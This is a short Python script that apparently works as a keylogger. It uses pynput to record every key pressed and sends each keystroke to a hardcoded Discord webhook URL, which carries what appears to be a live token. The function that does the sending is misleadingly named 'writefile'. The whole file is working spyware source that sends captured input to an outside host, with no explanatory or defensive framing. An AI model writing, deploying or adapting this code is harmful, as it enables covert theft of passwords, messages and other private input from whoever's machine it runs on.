from pynput.keyboard import Listener
from discord_webhook import DiscordWebhook, DiscordEmbed

hook = "https://discord.com/api/webhooks/920869229421527090/mG6IZA9jo8cQoytlHAp5waPTIjNah1VzMP4mM3UwMjEtQTMEY97fw9Ju8MNoTukvoLWA"

def writefile(key):
    try:
        letter = str(key)
        webhook = DiscordWebhook(url=hook, content=letter)
        response = webhook.execute()
    except KeyError:
        pass

with Listener(on_press=writefile) as lis:
    lis.join()